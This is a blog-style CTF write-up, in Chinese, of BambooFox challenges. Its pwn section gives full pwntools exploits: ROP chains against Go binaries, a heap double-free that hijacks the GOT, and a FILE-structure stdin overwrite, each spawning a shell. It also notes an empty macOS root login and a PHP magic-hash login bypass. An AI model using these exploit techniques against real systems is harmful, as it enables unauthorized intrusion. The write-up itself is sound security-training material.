---
title: BAMBOOFOX CTF 部分 writeup
tags:
  - CTF
date: 2018/2/10
---

网址:[http://ctf.bamboofox.cs.nctu.edu.tw/challenges](http://ctf.bamboofox.cs.nctu.edu.tw/challenges)

听说是他们的新生赛,毕竟我已经好几个月没打CTF了,赶紧去练习练习.(然后发现一堆不会做.....

## pwn

### water-impossible 50

简单的变量覆盖.

```
pay = 'a'*28+p64(6666)
```

flag:`BAMBOOFOX{Pwnnnnnnnning_1s_sImP13_and_Int3r3stIngggg}`

### infant-gogogo 180

突然感觉难度陡增有木有,居然上了一道用golang写的.好在溢出非常暴力,不是很难(不知道是不是正解

上来就让你输入,测试了一下有溢出,溢出长度为0x100.然后能够覆盖ret地址,接着就能rop了.

程序是静态编译,本能想着去找ropchain,然而无果.只能自己写了.无奈

ROPgadget搜了一下,连续的pop没有,不过倒是有很多`add rsp,xx;ret`的可以代替,不知道是不是golang编译的特点.

因为是静态编译,就没有plt之类的了.从他程序里面的函数找,我找到两个好用的.一个是`runtime_read`,作用相当于read.另一个是`syscall_Syscall`,相当于能够执行任意的syscall.

exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./infant-gogogo')
	bin = ELF('./infant-gogogo')
else:
	cn = remote('bamboofox.cs.nctu.edu.tw', 58795)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

runtime_read = 0x0000000000452140
main = 0x00000000004520A0
add_rsp_ret=0x0000000000401762#0x000000000040a520 : add rsp, 0x20 ; ret
syscall_Syscall = 0x0000000000462980
cn.recv()

pay = 'a'*0x100
pay += p64(runtime_read) +p64(add_rsp_ret) +p64(0)+p64(0x54fff0)+p64(0x10)+p64(0)
pay += p64(syscall_Syscall) +p64(add_rsp_ret) +p64(59)+p64(0x54fff0)+p64(0)+p64(0)

cn.sendline(pay)
cn.sendline('/bin/sh\x00')

cn.interactive()


'''
.text:0000000000452140 ; void __cdecl runtime_read()
.text:0000000000452140                 public runtime_read
.text:0000000000452140 runtime_read    proc near               ; CODE XREF: runtime_sysargs+1EE↑p
.text:0000000000452140                                         ; runtime_getRandomData+E2↑p
.text:0000000000452140
.text:0000000000452140 fd              = qword ptr  8
.text:0000000000452140 buf             = qword ptr  10h
.text:0000000000452140 count           = qword ptr  18h
.text:0000000000452140 arg_18          = dword ptr  20h
.text:0000000000452140
.text:0000000000452140                 mov     edi, dword ptr [rsp+fd] ; fd
.text:0000000000452144                 mov     rsi, [rsp+buf]  ; buf
.text:0000000000452149                 mov     edx, dword ptr [rsp+count] ; count
.text:000000000045214D                 xor     eax, eax
.text:000000000045214F                 syscall                 ; LINUX - sys_read
.text:0000000000452151                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000452157                 jbe     short loc_45215E
.text:0000000000452159                 mov     eax, 0FFFFFFFFh
.text:000000000045215E
.text:000000000045215E loc_45215E:                             ; CODE XREF: runtime_read+17↑j
.text:000000000045215E                 mov     [rsp+arg_18], eax
.text:0000000000452162                 retn
.text:0000000000452162 runtime_read    endp
'''

'''
.text:0000000000462980 ; void __cdecl syscall_Syscall()
.text:0000000000462980                 public syscall_Syscall
.text:0000000000462980 syscall_Syscall proc near               ; CODE XREF: syscall_Close+45↑p
.text:0000000000462980                                         ; syscall_fcntl+47↑p ...
.text:0000000000462980
.text:0000000000462980 arg_0           = qword ptr  8
.text:0000000000462980 dummy           = dword ptr  10h
.text:0000000000462980 arg_10          = qword ptr  18h
.text:0000000000462980 arg_18          = qword ptr  20h
.text:0000000000462980 arg_20          = qword ptr  28h
.text:0000000000462980 arg_28          = qword ptr  30h
.text:0000000000462980 arg_30          = qword ptr  38h
.text:0000000000462980
.text:0000000000462980                 call    runtime_entersyscall
.text:0000000000462985                 mov     rdi, qword ptr [rsp+dummy] ; dummy
.text:000000000046298A                 mov     rsi, [rsp+arg_10]
.text:000000000046298F                 mov     rdx, [rsp+arg_18]
.text:0000000000462994                 xor     r10d, r10d
.text:0000000000462997                 xor     r8d, r8d
.text:000000000046299A                 xor     r9d, r9d
.text:000000000046299D                 mov     rax, [rsp+arg_0]
.text:00000000004629A2                 syscall                 ; LINUX -
.text:00000000004629A4                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:00000000004629AA                 jbe     short loc_4629CC
.text:00000000004629AC                 mov     [rsp+arg_20], 0FFFFFFFFFFFFFFFFh
.text:00000000004629B5                 mov     [rsp+arg_28], 0
.text:00000000004629BE                 neg     rax
.text:00000000004629C1                 mov     [rsp+arg_30], rax
.text:00000000004629C6                 call    runtime_exitsyscall
.text:00000000004629CB                 retn
.text:00000000004629CC ; ---------------------------------------------------------------------------
.text:00000000004629CC
.text:00000000004629CC loc_4629CC:                             ; CODE XREF: syscall_Syscall+2A↑j
.text:00000000004629CC                 mov     [rsp+arg_20], rax
.text:00000000004629D1                 mov     [rsp+arg_28], rdx
.text:00000000004629D6                 mov     [rsp+arg_30], 0
.text:00000000004629DF                 call    runtime_exitsyscall
.text:00000000004629E4                 retn
.text:00000000004629E4 syscall_Syscall endp
'''
```

flag:`BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}`

### infant-gotoheaven 255

做完这题我开始怀疑我上一题是不是做复杂了(反思

这题和上一题同样是go,但是简单好多啊

还是有一个暴力的栈溢出,然后给了一个叫`main_weird`的函数,正常不可达到,进去就给你一个shell.

所以修改ret地址到这里即可.

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./infant-gotoheaven')
	bin = ELF('./infant-gotoheaven')
else:
	cn = remote('bamboofox.cs.nctu.edu.tw' ,58796)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.recv()

pay = 'a'*0xe0 + p64(0x00000000004A263F)

cn.sendline(pay)

cn.interactive()
```

flag:`BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}`

### MagicBook 455

delete函数中,free时没有检测指针是否非NULL,free完也没有清空指针.导致可以double free.

这边我使用freebin dup来做.

利用freebin dup到got前面附近,leak出free的地址,算出system地址.

再次利用freebin dup到got前面负荆,修改free为system.从而get shell.

exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./MagicBook')
	bin = ELF('./MagicBook')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('bamboofox.cs.nctu.edu.tw', 58798)
	libc = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add_chant(idx,length,con):
	cn.sendline('1')
	cn.recvuntil("want to use :")
	cn.sendline(str(idx))
	cn.recvuntil('your chant :')
	cn.sendline(str(length))
	cn.recvuntil('your chant :')
	cn.send(con)

def dele(idx):
	cn.sendline('2')
	cn.recvuntil("want to use :")
	cn.sendline(str(idx))

def spell(idx):
	cn.sendline('3')
	cn.recvuntil("want to use :")
	cn.sendline(str(idx))

add_chant(0,0x50,'aaaaaaaaaa')
add_chant(1,0x50,'bbbbbbbbbb')
add_chant(2,0x10,'bbbbbbbbbb')
dele(0)
dele(1)
dele(0)
dele(1)
dele(2)
#z('b*0x0000000000400981\nc')
pay = p64(0x602002-8)
add_chant(0,0x50,pay)
add_chant(1,0x50,'asdasd')
add_chant(2,0x50,'asdasd')
add_chant(3,0x50,'1'*14)

spell(3)

cn.recvuntil('1'*14)

libc_base = u64(cn.recv(6)+'\x00\x00')-libc.symbols['free']
success('libc_base: '+hex(libc_base))
system = libc_base+libc.symbols['system']


add_chant(2,0x20,'bbbbbbbbbb')
dele(1)
dele(0)
dele(1)
dele(0)
dele(2)

#z('b*0x0000000000400981\nc')
pay = p64(0x602002-8)
add_chant(0,0x50,pay)
add_chant(1,0x50,'asdasd')
add_chant(2,0x50,'asdasd')
add_chant(3,0x50,'/bin/sh\x00'.ljust(14)+p64(system))


dele(3)

cn.interactive()
```

flag:`BAMBOOFOX{Hehehe...R3M3m6er_t0_s3T_Ni1_aFt3r_Fr3333333}`


### toddler-notakto 500

这题是FILE结构体的利用,还是比较有难度的.

首先程序有两个漏洞:
1.输入名字的时候有溢出,而且没有零截断,正好可以leak出ret地址,从而得到libc基地址.
2.下棋的时候,没有检查边界,由于他是在所下的位置写0来标记,所以有了一个任意地址写0的漏洞.

但是任意地址写零太局限了,很难利用,所以分两步完成.

目标是stdin的`_IO_buf_base`.
`buf_base`和`buf_end`决定了scanf的buf,对`buf_base`最低位写0从而将stdin的结构体包在buf内,从而能够改写stdin的多数结构体成员,再次改写`buf_base`和`buf_end`到got,从而got hijack,想接下来马上call的puts写onegadget即可getshell.(注意onegadget的局限,我选择rax==NULL的,只需让scanf返回0即可

详细的利用可以参考angelboy的silde.
[https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)

exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./toddler-notakto')
	bin = ELF('./toddler-notakto')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote("bamboofox.cs.nctu.edu.tw", 58797)
	bin = ELF('./toddler-notakto')
	libc = ELF('./libc-2.23.so-14c22be9aa11316f89909e4237314e009da38883')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def write_zero(addr):
	cn.recvuntil('Your move: ')
	cn.sendline(str(addr-board))


cn.recvuntil('name: ')
cn.send('a'*0x28)
cn.recvuntil('a'*0x28)
libc.address = u64(cn.recv(6)+'\x00\x00')-libc.sym['__libc_start_main']-240
success('libc_base: '+hex(libc.address))

board=0x0000000000602080
stdin__IO_buf_base = libc.sym["_IO_2_1_stdin_"] + 0x38
if local:
	onegadget = libc.address+0x45216
else:
	pass

write_zero(stdin__IO_buf_base)


cn.recvuntil('move: ')
pay = p64(0)*3 + p64(bin.got['puts']) + p64(bin.got['puts'] + 0x78) + p64(0)
cn.sendline(pay)
sleep(0.5)
cn.recv()

z('b*0x0000000000400DC1\nc')
pay = '\x00'*0x20 +p64(onegadget)
cn.sendline(pay)
cn.interactive()



'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

## reverse

### little-asm 50

简单的异或.

```python
a='9E9D919E93939A9384A785ECA983E88E9983BD839BECEC98839DE991838EEFBD98B9AEA1'.decode('hex')
key = 0xdc

out=''

for i in range(len(a)):
	out+=chr(ord(a[i])^key)

print out
```

### little-asm-revenge 50

由于是诸位的加密,偷个懒,直接上爆破了.

```python
import string
def func1(n):
	r = n
	for i in range(0,7):
		if i&1:
			r ^= 1<<i
		else:
			r |= 1<<i

	return r

def func2(n):
	r = 1
	for i in range(7):
		r = (n*r)%481

	return r


enc=[0x19C,0x169,0x30,0x1D6,0x30,0x30,0x199,0x6A,0x157,0xc2,
0x10A,0x155,0x150,0x107,0x37,0x12E,0x22,0x0F1,0x1AE,
0x151,0x0F1,0x1A,0x1A5,0x1AE,0x0C9,0x12C,0x1,0x166,0x12c,
0x0CB,0x30,0x107,0x166,0x1B4,0x1AE,0x14C,0x46]


out =''

for i in range(len(enc)):
	for c in string.printable:
		s = ord(c) ^ func1(i)
		s = func2(s)
		if s == enc[i]:
			out+=c
			break

print out
```

### little-asm-impossible 95


乍一看这个函数很复杂,但是,提供的两个参数只在最后参与计算,所以只需要dump出最后`sub_555555554FC3`的返回值即可.
```cpp
__int64 __fastcall func1(int c, int ii)
{
  int v2; // eax
  int v3; // ST14_4
  int v4; // eax
  int v5; // ST0C_4
  unsigned int v6; // ST14_4
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // ST14_4
  unsigned int v10; // eax
  unsigned int v11; // ST0C_4
  int v12; // ST14_4
  int v13; // ST0C_4
  int v15; // [rsp+Ch] [rbp-Ch]
  signed int i; // [rsp+10h] [rbp-8h]
  int v17; // [rsp+14h] [rbp-4h]

  v15 = 0;
  sub_5555555547B0(0);
  v17 = sub_555555554CBD(0);
  for ( i = 0; i <= 4; ++i )
    v15 += sub_55555555484F(v17);
  v2 = sub_555555554D29(v17);
  v3 = sub_555555554D98(v2);
  v4 = sub_555555554993(v15);
  v5 = (unsigned __int64)sub_5555555548F1(v4) * v15;
  v6 = sub_555555554E07(v3);
  sub_555555554A35(v5 + v6);
  v7 = sub_555555554E76(v6);
  v8 = sub_555555554EE5(v7);
  v9 = v8;
  v10 = sub_555555554B79(v5 ^ v8);
  v11 = (unsigned __int64)sub_555555554AD7(v10) | v5;
  v12 = sub_555555554F54(v9);
  v13 = (signed int)v11 % (signed int)sub_555555554C1B(v11);
  return ii ^ (unsigned int)sub_555555554FC3(v12) ^ c;
}
```

调试后发现,`sub_555555554FC3`的返回值永远为0,所以前面哪些函数都是junk code.

```python
enc = '42404F414B4A404850723B546A3C406B4F504D5F7B6149277E46706E52764159554F61571515485A'.decode('hex')

out=''

for i in range(len(enc)):
	out += chr(ord(enc[i])^i)

print out
```


## forensic

### net-packet 50

先file一下
```
log-packet: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)
```
那果断wireshark启动

其中有一条:

```
Want to get the flag?
Of course~
BAMBOOF
OX{Ne
tL0g}
Thanks, bye!
```

flag:`BAMBOOFOX{NetL0g}`

### BambooFox-app 50

本地无法安装,只能拖jeb里.

发现flag...

```java
    public Object Button1$Click() {
        Object v0;
        runtime.setThisForm();
        if(runtime.callYailPrimitive(Scheme.numGEq, LList.list2(runtime.lookupGlobalVarInCurrentFormEnvironment(Screen1.Lit3, runtime.$Stthe$Mnnull$Mnvalue$St), Screen1.Lit21), Screen1.Lit22, ">=") != Boolean.FALSE) {
            runtime.setAndCoerceProperty$Ex(Screen1.Lit19, Screen1.Lit23, Boolean.FALSE, Screen1.Lit24);
            runtime.setAndCoerceProperty$Ex(Screen1.Lit19, Screen1.Lit16, "QkFNQk9PRk9Ye2phVmFfNFBQX2k1X2VhU3lfdDBfRDNjMG1waTFlfQ==", Screen1.Lit9);
            v0 = runtime.callComponentMethod(Screen1.Lit25, Screen1.Lit26, LList.list1("Flag in somewhere"), Screen1.Lit27);
        }
        else {
            runtime.callComponentMethod(Screen1.Lit25, Screen1.Lit26, LList.list1("Try harder!!!"), Screen1.Lit28);
            v0 = runtime.addGlobalVarToCurrentFormEnvironment(Screen1.Lit3, runtime.callYailPrimitive(AddOp.$Pl, LList.list2(runtime.lookupGlobalVarInCurrentFormEnvironment(Screen1.Lit3, runtime.$Stthe$Mnnull$Mnvalue$St), Screen1.Lit29), Screen1.Lit30, "+"));
        }

        return v0;
    }
```

base64解码即可

flag;`BAMBOOFOX{jaVa_4PP_i5_eaSy_t0_D3c0mpi1e}`

## web

### suck-login 50

题目说密码的md5值为`0e836584205638841937695747769655`,看到0e开头,那应该是PHP处理0e开头md5哈希字符串的bug了.

随便用一组
QNKCDZO
0e830400451993494058024219903391

flag:`BAMBOOFOX{pHp_cOnv3rt_sTring_T0_1nt3Ger_4ut0matIca11y}`

### tiny-git 50

看到git考虑git泄露

有工具[https://github.com/WangYihang/GitHacker](https://github.com/WangYihang/GitHacker)

拖回git后,在log里发现flag

```
commit 525bbb7f703d5ed25204404cebcf01ef3ba87878
Author: CALee <sz110010@gmail.com>
Date:   Sat Dec 30 11:11:38 2017 +0800

    hide BAMBOOFOX{hiDeiN5IDeg1T}

commit 3f931b1998ab98cb4e9a70fda4a89e967cc07481
Author: CALee <sz110010@gmail.com>
Date:   Sat Dec 30 10:59:16 2017 +0800

    ADD flag

commit 36c87263e4dd53addb7437befb1bedc3aa8a7596
Author: CALee <sz110010@gmail.com>
Date:   Sat Dec 30 10:55:13 2017 +0800

    Add bootstrap CSS

commit 03269f7aba9056cb167d0e82077d676b74d87770
Author: CALee <sz110010@gmail.com>
Date:   Sat Dec 30 10:42:52 2017 +0800

    Add title

```

## misc

### suck-browser 50

题目说`I hate browser. It sucks.`

所以用curl就行了

`curl http://bamboofox.cs.nctu.edu.tw:33333`

检测原理貌似是检测UA,没有UA就能通过了.

### suck-file 50

没啥意思,循环套压缩包,把头从'PK'改成'pk'.

我们就循环把头改成'PK',然后解压.

用python完成即可.

```python
import zipfile

fname = "a79cc81251ba4c66ed91ccd01b423598818a76cf"

while True:
    data = open(fname,'rb').read()
    if data.startswith("pk"):
        open(fname, "wb").write("PK" + data[2:])
    z = zipfile.ZipFile(fname)
    fname = z.namelist()[0]
    print fname
    z.extractall()
```

flag:`BAMBOOFOX{Fil3_hE4d3r_15_imp0rtaNt}`

### suck-apple 50

试了一会,一开始以为要从web方面考虑

但这是misc题,想到了之前mac的那个漏洞,root无密码登陆.

于是account填root,密码空,就进去了.....

flag:`BAMBOOFOX{3v3Ry0sHaVEbUG}`
